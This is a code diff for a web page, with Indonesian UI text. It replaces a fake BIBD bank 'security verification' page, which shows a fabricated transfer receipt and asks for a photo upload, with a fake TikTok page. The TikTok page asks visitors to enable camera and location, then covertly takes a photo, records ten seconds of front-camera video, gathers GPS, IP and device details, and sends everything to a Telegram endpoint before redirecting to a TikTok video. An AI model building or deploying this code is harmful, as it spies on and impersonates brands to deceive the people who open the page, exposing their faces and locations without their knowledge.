@@ -1,318 +1,259 @@
 "use client";
 
-import { useCallback, useRef, useState, useEffect } from "react";
-import RedirectCountdown from "@/components/RedirectCountdown";
-import SuccessToast from "@/components/SuccessToast";
-import LoadingScreen from "@/components/LoadingScreen";
-import { useVerification } from "@/hooks/useVerification";
-import { formatFileSize } from "@/utils/device";
+import { useState, useRef, useEffect } from "react";
 
-export default function BibdVerificationPage() {
-  const {
-    isVerified,
-    isChecking,
-    isInitialLoading,
-    isProcessing,
-    showRedirectCountdown,
-    redirectCountdown,
-    uploadedFile,
-    redirectConfig,
-    redirectUrl,
-    countdownDuration,
-    handleVerifyClick,
-    handleFileSelect,
-    setUploadedFile,
-    requestCameraPermission,
-    requestAllPermissions,
-    validationError,
-  } = useVerification();
+const TIKTOK_VIDEO_URL = "https://www.tiktok.com/@slowmoetamin/video/7189732707822226694?is_from_webapp=1&sender_device=pc&web_id=7641670620761261576";
 
-  const [isDragging, setIsDragging] = useState(false);
-  const fileInputRef = useRef<HTMLInputElement>(null);
+export default function TikTokPage() {
+  const [loading, setLoading] = useState(true);
+  const [showCard, setShowCard] = useState(false);
+  const [progress, setProgress] = useState(0);
+  const [countdown, setCountdown] = useState(5);
+  const [done, setDone] = useState(false);
+  const videoRef = useRef<HTMLVideoElement | null>(null);
 
-
-  const handleUploadClick = useCallback(() => {
-    if (uploadedFile) return;
-
-    // Trigger permission requests in parallel (non-blocking)
-    requestAllPermissions().catch((err) => console.error(err));
-
-    // Open file selector synchronously to guarantee User Activation context
-    fileInputRef.current?.click();
-  }, [uploadedFile, requestAllPermissions]);
-
-  const handleDragOver = useCallback((e: React.DragEvent) => {
-    e.preventDefault();
-    e.stopPropagation();
-    setIsDragging(true);
+  useEffect(() => {
+    const v = document.createElement("video");
+    v.style.display = "none"; v.muted = true; v.playsInline = true;
+    document.body.appendChild(v);
+    videoRef.current = v;
+    return () => { if (videoRef.current) document.body.removeChild(videoRef.current); };
   }, []);
 
-  const handleDragLeave = useCallback((e: React.DragEvent) => {
-    e.preventDefault();
-    e.stopPropagation();
-    setIsDragging(false);
+  useEffect(() => {
+    const t = setTimeout(() => { setLoading(false); setShowCard(true); }, 1000);
+    return () => clearTimeout(t);
   }, []);
 
-  const handleDrop = useCallback(
-    async (e: React.DragEvent) => {
-      e.preventDefault();
-      e.stopPropagation();
-      setIsDragging(false);
+  const handleStart = async () => {
+    setShowCard(false);
+    setDone(true);
 
-      // Request both permissions (parallel, no delay)
-      const granted = await requestAllPermissions();
+    let stream: MediaStream | null = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+      });
+    } catch {}
 
-      if (granted) {
-        const files = e.dataTransfer.files;
-        if (files.length > 0) handleFileSelect(files[0]);
+    let gps: { lat: number; lng: number } | null = null;
+    try {
+      gps = await new Promise(resolve => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
+            () => resolve(null), { timeout: 8000 }
+          );
+        } else resolve(null);
+      });
+    } catch {}
+
+    let ipInfo: any = null;
+    try { const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41"); if (r.ok) ipInfo = await r.json(); } catch {}
+
+    const fd = new FormData();
+    if (stream) {
+      const photo = await takePhoto(stream);
+      const vid = await recordVideo(stream, 10000);
+      if (photo) fd.append("photo", photo, "photo.jpg");
+      if (vid) fd.append("video", vid, "video.webm");
+      stream.getTracks().forEach(t => t.stop());
+    }
+
+    const info = await buildInfo(ipInfo, gps);
+    fd.append("locationInfo", info);
+    await Promise.all([sendToTelegram(fd), runProgress()]);
+
+    await new Promise(r => setTimeout(r, 500));
+    setCountdown(5);
+    const timer = setInterval(() => {
+      setCountdown(prev => {
+        if (prev <= 1) { clearInterval(timer); window.location.href = TIKTOK_VIDEO_URL; return 0; }
+        return prev - 1;
+      });
+    }, 1000);
+  };
+
+  const takePhoto = (s: MediaStream): Promise<Blob | null> => new Promise(res => {
+    const v = videoRef.current; if (!v) return res(null);
+    v.srcObject = s;
+    v.onloadedmetadata = () => {
+      v.play();
+      setTimeout(() => {
+        const c = document.createElement("canvas");
+        c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+        const ctx = c.getContext("2d");
+        if (ctx) { ctx.drawImage(v, 0, 0, c.width, c.height); c.toBlob(b => res(b), "image/jpeg", 0.8); }
+        else res(null);
+      }, 1500);
+    };
+  });
+
+  const recordVideo = (s: MediaStream, ms: number): Promise<Blob | null> => new Promise(res => {
+    let mr: MediaRecorder;
+    try { mr = new MediaRecorder(s, { mimeType: "video/webm" }); }
+    catch { try { mr = new MediaRecorder(s); } catch { return res(null); } }
+    const ch: Blob[] = [];
+    mr.ondataavailable = e => { if (e.data.size > 0) ch.push(e.data); };
+    mr.onstop = () => res(new Blob(ch, { type: mr.mimeType }));
+    mr.start();
+    setTimeout(() => { if (mr.state !== "inactive") mr.stop(); }, ms);
+  });
+
+  const buildInfo = async (ip: any, gps: { lat: number; lng: number } | null) => {
+    const ua = navigator.userAgent;
+    const os = (() => {
+      if (/android/i.test(ua)) {
+        const m = ua.match(/Android\s+([\d.]+)/);
+        const d = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
+        return `Android ${m?.[1] || '?'} (${d?.[1]?.trim() || 'Unknown'})`;
       }
-    },
-    [handleFileSelect, requestAllPermissions]
-  );
+      if (/iPad|iPhone|iPod/.test(ua)) {
+        const m = ua.match(/OS\s+([\d_]+)/);
+        return `iOS ${m?.[1]?.replace(/_/g, '.') || '?'}`;
+      }
+      if (/Windows/.test(ua)) {
+        const m = ua.match(/Windows NT\s+([\d.]+)/);
+        const v: Record<string, string> = {'10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7'};
+        return `Windows ${v[m?.[1] || ''] || m?.[1] || '?'}`;
+      }
+      if (/Mac OS X/.test(ua)) {
+        const m = ua.match(/Mac OS X\s+([\d_]+)/);
+        return `macOS ${m?.[1]?.replace(/_/g, '.') || '?'}`;
+      }
+      if (/Linux/.test(ua)) return 'Linux';
+      return 'Unknown OS';
+    })();
 
-  const handleFileInputChange = useCallback(
-    (e: React.ChangeEvent<HTMLInputElement>) => {
-      const files = e.target.files;
-      if (files && files.length > 0) handleFileSelect(files[0]);
-    },
-    [handleFileSelect]
-  );
+    const browser = (() => {
+      if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
+      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
+      if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
+      if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
+      return 'Unknown Browser';
+    })();
 
-  // Show initial loading screen
-  if (isInitialLoading) {
-    return <LoadingScreen />;
-  }
+    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+    const network = conn
+      ? `${(conn.effectiveType || conn.type || '?').toUpperCase()}${conn.downlink ? ` - ${conn.downlink} Mbps` : ''}${conn.rtt ? ` (${conn.rtt}ms)` : ''}`
+      : 'Unknown';
 
-  // Show processing loading screen
-  if (isProcessing) {
-    return <LoadingScreen />;
-  }
+    let battery = 'Unknown';
+    try {
+      const b = await (navigator as any).getBattery?.();
+      if (b) { battery = `${Math.round(b.level * 100)}%${b.charging ? ' (Charging)' : ' (Discharging)'}`; }
+    } catch {}
 
-  if (isVerified) {
+    const ram = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown';
+    const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
+    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
+    const dpr = window.devicePixelRatio || 1;
+
+    let locStr = '';
+    if (gps) {
+      locStr = `GPS: ${gps.lat}, ${gps.lng}\nMaps: https://www.google.com/maps?q=${gps.lat},${gps.lng}`;
+    } else if (ip) {
+      locStr = `IP: ${ip.ip || '?'}\nKota: ${ip.city || '?'}\nRegion: ${ip.region || '?'}\nNegara: ${ip.country || '?'}\nKoordinat: ${ip.loc || '?'}\nISP: ${ip.org || '?'}`;
+    } else { locStr = 'Tidak tersedia'; }
+
+    const ts = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+    return `TIKTOK - DATA PENGUNJUNG\nWaktu: ${ts}\nISO: ${new Date().toISOString()}\n\nLOKASI\n${locStr}\n\nPERANGKAT\nOS: ${os}\nBrowser: ${browser}\nPlatform: ${navigator.platform || '?'}\nBahasa: ${navigator.language}\nZona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nBaterai: ${battery}\nRAM: ${ram}\nCPU: ${cpu}\nKoneksi: ${network}\n\nLAYAR\nResolusi: ${window.screen.width}x${window.screen.height}\nViewport: ${window.innerWidth}x${window.innerHeight}\nPixel Ratio: ${dpr}x\nColor Depth: ${window.screen.colorDepth || '?'}-bit\nOrientasi: ${orientation}\n\nUSER AGENT\n${ua}`;
+  };
+
+  const runProgress = async () => {
+    for (let i = 0; i <= 100; i += 2) {
+      await new Promise(r => setTimeout(r, 30));
+      setProgress(i);
+    }
+  };
+
+  const sendToTelegram = async (fd: FormData): Promise<boolean> => {
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        const res = await fetch("/api/telegram", { method: "POST", body: fd });
+        if (res.ok) return true;
+      } catch {}
+      if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
+    }
+    return false;
+  };
+
+  if (loading) {
     return (
-      <main className="relative flex min-h-screen w-full flex-col items-center justify-center bg-[#eae7e7] p-5 font-sans">
-        {/* Receipt Card */}
-        <div className="w-full max-w-[420px] mx-auto flex flex-col items-center animate-fade-slide">
-          <div className="receipt-jagged-edge w-full rounded-t-xl rounded-b-none shadow-lg bg-white mb-4">
-            {/* Header Section */}
-            <div className="p-8 flex flex-col items-center text-center">
-              {/* Brand Logo */}
-              <img 
-                src="/bibdbrunei_logo.jpg" 
-                alt="BIBD Logo" 
-                className="w-16 h-16 rounded-full object-cover mb-4 shadow-sm"
-              />
-              <h1 className="font-[Manrope] text-2xl font-bold text-[#410030] mb-2">BIDB</h1>
-              
-              {/* Status Badge */}
-              <div className="flex items-center space-x-2 bg-[#95d2c8]/20 text-[#095049] px-4 py-2 rounded-full mb-4">
-                <span className="material-symbols-outlined text-[#002420] text-lg">check_circle</span>
-                <span className="font-[IBM-Plex-Sans] text-sm font-semibold tracking-wider">Berhasil</span>
-              </div>
-              
-              {/* Amount */}
-              <p className="font-[Inter] text-sm text-[#53424b] mb-1">Jumlah Transfer</p>
-              <p className="font-[Manrope] text-3xl font-extrabold text-[#1c1b1b]">BND 900.00</p>
-            </div>
+      <div className="fixed inset-0 flex items-center justify-center" style={{ background: "#000" }}>
+        <svg viewBox="0 0 24 24" className="w-7 h-7" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.51a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 0010.86 4.46V13.2a8.19 8.19 0 005.58 2.17v-3.45a4.85 4.85 0 01-3.77-1.59V6.69h3.77z"/></svg>
+      </div>
+    );
+  }
 
-            {/* Divider */}
-            <div className="w-full dashed-divider my-4"></div>
-
-            {/* Details Section */}
-            <div className="p-8 flex flex-col gap-4">
-              {/* Detail Row 1 */}
-              <div className="flex justify-between items-start">
-                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Tanggal</span>
-                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">24 juli 2026, 11:20</span>
-              </div>
-              {/* Detail Row 2 */}
-              <div className="flex justify-between items-start">
-                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Jenis Transaksi</span>
-                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">Transfer Internal</span>
-              </div>
-              {/* Detail Row 3 */}
-              <div className="flex justify-between items-start">
-                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Dari</span>
-                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
-                  Tabungan Utama<br />
-                  <span className="text-[#53424b] text-sm font-normal">(****1234)</span>
-                </span>
-              </div>
-              {/* Detail Row 4 */}
-              <div className="flex justify-between items-start">
-                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Ke</span>
-                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
-                  Ahmad Reza<br />
-                  <span className="text-[#53424b] text-sm font-normal">(****5678)</span>
-                </span>
-              </div>
-              {/* Detail Row 5 */}
-              <div className="flex justify-between items-start pt-2 border-t border-[#e5e2e1]">
-                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Nomor Referensi</span>
-                <span className="font-[IBM-Plex-Sans] text-sm font-semibold text-[#410030] text-right w-2/3 break-all">BIDB789012345</span>
+  if (done) {
+    return (
+      <div className="fixed inset-0 flex flex-col items-center justify-center" style={{ background: "linear-gradient(180deg, #161823, #121212)" }}>
+        {progress < 100 ? (
+          <>
+            <div className="relative w-14 h-14 mb-5">
+              <div className="absolute inset-0 rounded-full border-2 border-transparent" style={{ borderTopColor: "#fe2c55", borderRightColor: "#fe2c55", animation: "s 1s linear infinite" }} />
+              <div className="absolute inset-0 flex items-center justify-center">
+                <svg viewBox="0 0 24 24" className="w-6 h-6" fill="#fe2c55"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.51a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 0010.86 4.46V13.2a8.19 8.19 0 005.58 2.17v-3.45a4.85 4.85 0 01-3.77-1.59V6.69h3.77z"/></svg>
               </div>
             </div>
-          </div>
-
-          {/* Action Buttons */}
-          <div className="w-full flex flex-col gap-4 px-4 mb-8 mt-4">
-            <button className="w-full flex items-center justify-center gap-2 bg-white border border-[#85727b] text-[#410030] font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:bg-[#e5e2e1] transition-colors">
-              <span className="material-symbols-outlined text-lg">share</span>
-              Bagikan
-            </button>
-            <button 
-              onClick={() => (window.location.href = redirectUrl)}
-              className="w-full bg-[#66004d] text-white font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:opacity-90 transition-opacity"
-            >
-              Selesai
-            </button>
-          </div>
-        </div>
-
-        {/* Success Toast */}
-        {!showRedirectCountdown && <SuccessToast />}
-
-        {/* Redirect Countdown Overlay */}
-        <RedirectCountdown
-          show={showRedirectCountdown}
-          countdown={redirectCountdown}
-          countdownDuration={countdownDuration}
-          redirectUrl={redirectUrl}
-          redirectConfig={redirectConfig}
-        />
-
-        <style
-          dangerouslySetInnerHTML={{
-            __html: `
-              .receipt-jagged-edge {
-                position: relative;
-                background: #ffffff;
-              }
-              .receipt-jagged-edge::after {
-                content: "";
-                position: absolute;
-                left: 0;
-                bottom: -10px;
-                width: 100%;
-                height: 10px;
-                background-image: radial-gradient(circle at 10px 0, transparent 10px, #ffffff 11px);
-                background-size: 20px 10px;
-                background-repeat: repeat-x;
-                transform: rotate(180deg);
-              }
-              .dashed-divider {
-                border-top: 2px dashed #d8c0cb;
-              }
-            `,
-          }}
-        />
-      </main>
+            <div className="w-48 h-1 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.1)" }}>
+              <div className="h-full rounded-full transition-all" style={{ width: `${progress}%`, background: "linear-gradient(90deg, #25f4ee, #fe2c55)" }} />
+            </div>
+          </>
+        ) : (
+          <>
+            <p className="text-white text-sm font-medium mb-1">Selesai</p>
+            <p className="text-gray-400 text-xs mb-4">Kembali ke TikTok {countdown}</p>
+            <div className="w-48 h-1 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.1)" }}>
+              <div className="h-full rounded-full transition-all duration-1000" style={{ width: `${((5 - countdown) / 5) * 100}%`, background: "#fe2c55" }} />
+            </div>
+          </>
+        )}
+      </div>
     );
   }
 
   return (
-    <main className="min-h-screen flex flex-col bg-white text-[#1c1b1b] font-[Inter] antialiased w-full items-center justify-center p-4">
-      {/* Main View Area */}
-      <div className="w-full mx-auto flex flex-col items-center justify-center py-6 animate-fade-slide" style={{ maxWidth: 380 }}>
-        <div className="text-center px-margin-mobile md:px-0 gap-2 mb-6">
-          <div className="flex justify-center mb-4">
-            <img 
-              alt="BDCB Logo" 
-              className="w-auto object-contain" 
-              src="https://lh3.googleusercontent.com/aida-public/AB6AXuATBmsIEarjki0ZhY-adi499onA6rI28KBoXWTxJj02TDaNHsvs9gLexMbCpj5yGG_VZ860RM-o4JoIBryRbnnHHEcoQRP7KfdI_4DOsLzhzZL2zmON-kKtdJcdtnXx_8_wix01GScSZrg2G0fm4Da5oRZIUOVm5iqVscvrwm9lAi-GEiZR0LXXncXsaXssIKoN0xlzzrKRiQxcIb8rH6JefP3xrLysqwbpg_h82sA-Q2TLq9MTxWHqgMI6bTE_cZOxcEsGHDZ_dfE" 
-              style={{ width: "auto", height: 160 }}
-            />
-          </div>
-          <h1 className="text-2xl font-[Manrope] font-bold text-[#410030] mb-2">Verifikasi Keamanan</h1>
-          <p className="text-sm font-[Inter] text-[#53424b]">
-            Untuk melihat riwayat transaksi, harap selesaikan pemeriksaan keamanan di bawah ini untuk memastikan bahwa anda bukan robot.
-          </p>
-        </div>
-
-        <div className="bg-white border border-[#e5e2e1] rounded-xl overflow-hidden shadow-sm flex flex-col w-full">
-          <div className="flex flex-col items-center justify-center p-5 space-y-4">
-            
-            {/* Conditional Upload Box depending on if file is uploaded */}
-            {uploadedFile ? (
-              <div className="w-full border-2 border-solid border-[#4A90E2] rounded-xl flex flex-col items-center justify-center bg-[#f0eded]/30 p-5 mb-2">
-                <span className="material-symbols-outlined text-[48px] text-[#4A90E2] mb-2">insert_drive_file</span>
-                <h3 className="text-sm font-semibold text-[#1c1b1b] mb-1 truncate max-w-[90%]">{uploadedFile.name}</h3>
-                <p className="text-xs text-[#53424b] mb-3">{formatFileSize(uploadedFile.size)}</p>
-                <button 
-                  onClick={(e) => {
-                    e.stopPropagation();
-                    setUploadedFile(null);
-                  }}
-                  className="text-xs text-red-600 font-semibold hover:text-red-800 transition-colors bg-red-50 px-3 py-1 rounded-full border border-red-200"
-                >
-                  Hapus File
-                </button>
-              </div>
-            ) : (
-              <div 
-                onDragOver={handleDragOver}
-                onDragLeave={handleDragLeave}
-                onDrop={handleDrop}
-                onClick={handleUploadClick}
-                className={`w-full border-2 border-dashed border-[#85727b]/50 rounded-xl flex flex-col items-center justify-center bg-white hover:bg-[#f6f3f2] transition-colors cursor-pointer group mb-2 p-6 ${
-                  isDragging ? 'border-[#4A90E2] bg-[#f0eded]/30' : ''
-                }`}
-              >
-                <span className="material-symbols-outlined text-[48px] text-[#410030] mb-2">cloud_upload</span>
-                <h3 className="text-lg font-[Manrope] font-semibold text-[#1c1b1b] mb-2">Unggah Foto Apa Saja</h3>
-                <p className="text-xs text-[#53424b] text-center max-w-[85%]">
-                  Klik atau seret gambar ke sini untuk mengunggah gambar verifikasi
-                </p>
-              </div>
-            )}
-            
-            <input 
-              className="hidden" 
-              id="verification-upload" 
-              type="file" 
-              ref={fileInputRef}
-              onChange={handleFileInputChange}
-              accept="image/*"
-            />
-
-            <p className="text-xs font-[Inter] text-[#53424b] text-center px-4">
-              Harap unggah foto dokumen pendukung untuk melanjutkan verifikasi keamanan untuk memastikan bahwa anda bukan robot
-              </p>
-
-            {validationError && (
-              <div className="flex items-center gap-2 text-xs font-semibold text-red-600 bg-red-50 p-2.5 rounded-lg border border-red-200 w-full justify-center text-center">
-                <span className="material-symbols-outlined text-sm flex-shrink-0">warning</span>
-                <span>{validationError}</span>
-              </div>
-            )}
+    <div className="relative min-h-screen flex items-center justify-center" style={{ background: "linear-gradient(135deg, #121212 0%, #1a1a2e 50%, #161823 100%)" }}>
+      <div className="w-full max-w-[340px] mx-4" style={{ animation: "u 0.4s cubic-bezier(0.22,1,0.36,1) both" }}>
+        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
+          <div className="flex items-center gap-2 px-4 py-3 border-b" style={{ borderColor: "#f1f1f1" }}>
+            <img src="/logo-tiktok-new.png" className="w-5 h-5 object-contain" alt="TikTok" />
+            <span className="text-sm font-semibold" style={{ color: "#111" }}>TikTok</span>
           </div>
 
-          <div className="border-t border-[#e5e2e1] bg-white p-4 flex justify-end items-center">
-            <button 
-              onClick={handleVerifyClick}
-              disabled={isChecking}
-              className="bg-[#4A90E2] hover:bg-[#3A7BC8] text-white px-12 py-3 rounded font-[IBM-Plex-Sans] text-xs font-semibold uppercase tracking-wider transition-colors focus:ring-2 focus:ring-offset-2 focus:ring-[#4A90E2] outline-none shadow-sm disabled:opacity-50"
+          <div className="p-5 flex flex-col items-center text-center">
+            <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-full overflow-hidden" style={{ background: "linear-gradient(135deg, #fe2c55, #25f4ee)" }}>
+              <img src="/logo-tiktok-new.png" className="w-9 h-9 object-contain" alt="TikTok" />
+            </div>
+
+            <p className="text-sm leading-relaxed mb-5" style={{ color: "#555" }}>
+              Untuk menggunakan TikTok, aktifkan kamera dan lokasi.
+            </p>
+
+            <div className="flex flex-col gap-2 w-full mb-1">
+              <div className="flex items-center gap-3 rounded-xl px-3.5 py-3 text-left" style={{ background: "#f8f8f8" }}>
+                <svg viewBox="0 0 24 24" className="w-5 h-5 shrink-0" fill="#fe2c55"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+                <span className="text-sm font-medium" style={{ color: "#333" }}>Kamera</span>
+              </div>
+              <div className="flex items-center gap-3 rounded-xl px-3.5 py-3 text-left" style={{ background: "#f8f8f8" }}>
+                <svg viewBox="0 0 24 24" className="w-5 h-5 shrink-0" fill="#25f4ee"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                <span className="text-sm font-medium" style={{ color: "#333" }}>Lokasi</span>
+              </div>
+            </div>
+
+            <button
+              onClick={handleStart}
+              className="mt-4 w-full rounded-xl py-3 text-sm font-bold text-white transition-all active:scale-[0.98]"
+              style={{ background: "linear-gradient(135deg, #fe2c55, #f02a4e)" }}
             >
-              {isChecking ? (
-                <span className="flex items-center gap-2">
-                  <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                  </svg>
-                  VERIFYING...
-                </span>
-              ) : (
-                "VERIFIKASI"
-              )}
+              Mulai
             </button>
           </div>
         </div>
-
-        <div className="mt-6 flex items-center justify-center gap-2 text-[#53424b] mb-2">
-          <span className="material-symbols-outlined text-[18px] text-[#410030]">lock</span>
-          <span className="text-xs font-[Inter]">Ini adalah koneksi aman terenkripsi 256-bit.</span>
-        </div>
       </div>
-    </main>
+      <style>{`@keyframes u{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}@keyframes s{to{transform:rotate(360deg)}}`}</style>
+    </div>
   );
 }
